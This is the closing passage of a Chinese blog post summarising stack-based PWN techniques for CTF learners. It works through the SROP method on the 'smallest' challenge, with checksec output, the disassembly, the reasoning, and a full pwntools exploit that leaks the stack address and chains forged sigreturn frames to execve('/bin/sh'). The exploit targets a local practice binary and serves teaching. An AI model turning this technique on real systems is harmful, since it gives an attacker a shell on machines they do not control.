class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这俩结构不需要去刻意的去记，在pwntools有现成的对象可以直接转换。需要注意的是想要实现SROP攻击必须要具备下面几个条件</p>
<ul>
<li>可以通过栈溢出来控制栈的内容</li>
<li>需要知道binsh的地址</li>
<li>可以触发signal系统调用<br>下面看一道例题。</li>
</ul>
<h3 id="题目来源-9"><a href="#题目来源-9" class="headerlink" title="题目来源"></a>题目来源</h3><p>这里以 360 春秋杯中的 smallest-pwn 为例进行简单介绍。<br>下载地址： <a target="_blank" rel="noopener" href="https://github.com/bjrjk/pwn-learning/blob/main/ROP/SROP/360chunqiu2017_smallest/smallest">https://github.com/bjrjk/pwn-learning/blob/main/ROP/SROP/360chunqiu2017_smallest/smallest</a></p>
<h3 id="文件类型-9"><a href="#文件类型-9" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/CTF例题/PWN/smallest]</span><br><span class="line">└─# file smallest</span><br><span class="line">smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure>
<p>是一个64位的静态文件</p>
<h3 id="软件防护-7"><a href="#软件防护-7" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/CTF例题/PWN/smallest]</span><br><span class="line">└─# checksec smallest</span><br><span class="line">[*] <span class="string">&#x27;/mnt/e/CTF例题/PWN/smallest/smallest&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>NX是开启的，栈内不能执行。</p>
<h3 id="IDA分析-9"><a href="#IDA分析-9" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>ida中的反编译出来的内容也很简单，没有C代码只有这几行汇编，其他的啥也没有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:00000000004000C0                 retn</span><br></pre></td></tr></table></figure>
<h3 id="攻击思路-9"><a href="#攻击思路-9" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>其实就这点内容有用的内容全ida中，就只是几行汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h</span><br><span class="line">mov     rsi, rsp</span><br><span class="line">mov     rdi, rax</span><br><span class="line">syscall</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
<p>触发系统调用的参数分别如下</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAX = 0</span><br><span class="line">RDI = 0</span><br><span class="line">RSI = RSP</span><br><span class="line">RDX = 400</span><br></pre></td></tr></table></figure>
<p>相当于调用了下面的内容，0是标准输入即从屏幕输入，然后写入RSP寄存器的位置即栈顶，写入400个字符。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_read(0,RSP,400)</span><br></pre></td></tr></table></figure>
<p>我们这里直接 往rsp中写入数据，并且他没有继续操控栈数据，我们就可以不需要计算的直接往RSP写入返回地址，他会直接去执行我们写入位置的代码。这类题目基本就是SROP了，后面会说一下做题可能会遇到的一些疑问。他这里往rsp中读取数据，我们直接写入3个<code>0x4000B0</code>,<code>ret</code>的时候会直接跳转到这里，然后如果正常的输出就会重复运行3次当前的程序，当<code>ret</code>之后的战是这样的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250514141852.png"><br>进入第一个输入<code>0x4000B0</code>，也就是从头执行，这次我们要控制执行流从<code>0x4000BB</code>开始执行，也可以从<code>0x4000B3</code>开始，目的是为了跳过最开始的<code>xor rax,rax</code>指令，因为这个指令会清除rax，此时输入数据<code>0xBB</code>他就会覆盖RSP的前两位，让<code>0x4000B0</code>变成<code>0x4000BB</code>,并且这一次syscall结束之后<code>rax</code>会变成1，然后<code>ret</code>会直接到<code>0x4000BB</code>，<code>rax</code>变成1的原因是rax会存储系统调用的返回值，<code>sys_read</code>的返回值是输入数据的长度，第二次syscall的时候寄存器参数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RAX = 1</span><br><span class="line">RDI = 0</span><br><span class="line">RSI = RSP</span><br><span class="line">RDX = 400</span><br></pre></td></tr></table></figure>
<p>RAX是1的时候执行write写入指令，执行的参数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys_write(0,RSP,400)</span><br></pre></td></tr></table></figure>
<p>写入屏幕RSP的值，并且是从RSP开始写400个数据，这样我们就拿到了RSP的指，我们后面写入<code>binsh</code>就可以根据这个地址来确定地址，此时进入到第三个<code>0x4000B0</code>中，这个时候我们需要通过signal机制触发一个写入系统调用，写入的位置就是基于刚才写回来的地址，需要多写一些垃圾数据，记住他的位置，如果直接写入binsh会被覆盖掉，binsh写入之后再次通过signal机制触发<code>execve</code>命令执行，并且写入我们刚才写入binsh的位置即可拿到sh。</p>
<h3 id="攻击脚本-7"><a href="#攻击脚本-7" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./smallest&quot;</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x4000B0</span></span><br><span class="line">syscall_addr = <span class="number">0x4000BE</span></span><br><span class="line">payload = p64(start_addr) * <span class="number">3</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.send(&quot;\xbb&quot;)</span></span><br><span class="line">io.send(p8(<span class="number">0xBB</span>))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">addr = io.recv()</span><br><span class="line">rsp_addr = <span class="built_in">hex</span>(u64(addr[<span class="number">16</span>:<span class="number">24</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(addr[<span class="number">16</span>:<span class="number">24</span>])))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read binsh</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_read</span><br><span class="line">sigframe.rdi = <span class="number">0</span></span><br><span class="line">sigframe.rsi = u64(addr[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">sigframe.rdx = <span class="number">0x200</span></span><br><span class="line">sigframe.rsp = u64(addr[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.send(p64(start_addr) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + <span class="built_in">bytes</span>(sigframe))</span><br><span class="line">io.send(p64(syscall_addr) + <span class="string">b&quot;b&quot;</span> * <span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload = p64(start_addr).ljust(<span class="number">0x120</span>, <span class="string">b&quot;b&quot;</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0)</span></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = u64(addr[<span class="number">16</span>:<span class="number">24</span>]) + <span class="number">0x120</span></span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rsp = u64(addr[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">sigframe.rip = syscall_addr</span><br><span class="line"></span><br><span class="line">payload = p64(start_addr) + <span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + <span class="built_in">bytes</span>(sigframe)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(p64(syscall_addr) + <span class="string">b&quot;b&quot;</span> * <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><h1 id="其他辅助性漏洞"><a href="#其他辅助性漏洞" class="headerlink" title="其他辅助性漏洞"></a>其他辅助性漏洞</h1><h2 id="整型溢出"><a href="#整型溢出" class="headerlink" title="整型溢出"></a>整型溢出</h2><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h2 id="金丝雀防护绕过"><a href="#金丝雀防护绕过" class="headerlink" title="金丝雀防护绕过"></a>金丝雀防护绕过</h2><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><h2 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h2><p>PWN的学习相对于其他的方向来说我认为是非常费劲，但是学会之后的利用相比于其他方向还是更容易懂的。对于pwn很多地方都需要自己去做调试(栈还好，到堆不仅得使劲去调，还得读glibc源码)，去想构造的exp每一步执行之后的栈结构，不然很难去理解他真正干了什么事，然后还是学习需要一些汇编基础，没有的话学起来会更加的费劲。还有就是这个东西还是坚持比较重要，坚持下去肯定是会有结果的。本文是我自己学习过程中的一些总结，基于博主的进度，后续的其他内容会根据博主的学习进度进行补充，有些部分理解的可能并不完全对，欢迎师傅指正。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>题目相关的全都已经加入在题目来源上了，然后下面是学习栈相关的视频</p>
<blockquote>
<p>CTF-WIKI: <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a><br>XMCVE 2020 CTF Pwn入门课程: <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1854y1y7Ro">https://www.bilibili.com/video/BV1854y1y7Ro</a><br>国资社畜-你想有多PWN(不再更新): <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1mr4y1Y7fW">https://www.bilibili.com/video/BV1mr4y1Y7fW</a><br>yichen小菜鸡-CTF学习系列: <a target="_blank" rel="noopener" href="https://space.bilibili.com/24337218/lists/393118?type=series">https://space.bilibili.com/24337218/lists/393118?type=series</a><br>PolarCTF入门系列讲座-PWN篇: <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1ub4y1F71R">https://www.bilibili.com/video/BV1ub4y1F71R</a></p>
</blockquote>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/PWN/" rel="tag"># PWN</a>
              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
              <a href="/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/" rel="tag"># 栈漏洞</a>
              <a href="/tags/ROP/" rel="tag"># ROP</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/04/28/hello-world/" rel="prev" title="Hello World">
                  <i class="fa fa-angle-left"></i> Hello World
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/05/20/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E2%80%9CParloo%E2%80%9DCTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B-%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94%E6%96%B9%E5%90%91-WriteUp/" rel="next" title="第二届“Parloo”CTF应急响应挑战赛-应急相应方向-WriteUp">
                  第二届“Parloo”CTF应急响应挑战赛-应急相应方向-WriteUp <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments" id="waline"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">BoyChai</span>
    <a href="/atom.xml" target="_blank">RSS</a>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">158k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">9:36</span>
  </span>
</div>
<div class="busuanzi-count">
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动 
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>
<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"waline-server-ten-phi.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":false,"pageview":false,"avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"requiredMeta":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2025/05/11/PWN-%E6%A0%88%E7%B3%BB%E5%88%97%E6%80%BB%E7%BB%93/"}</script>
<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
<script>
document.addEventListener('page:loaded', () => {
  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
  ).then(() => 
    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
  );
});
</script>

</body>
</html>
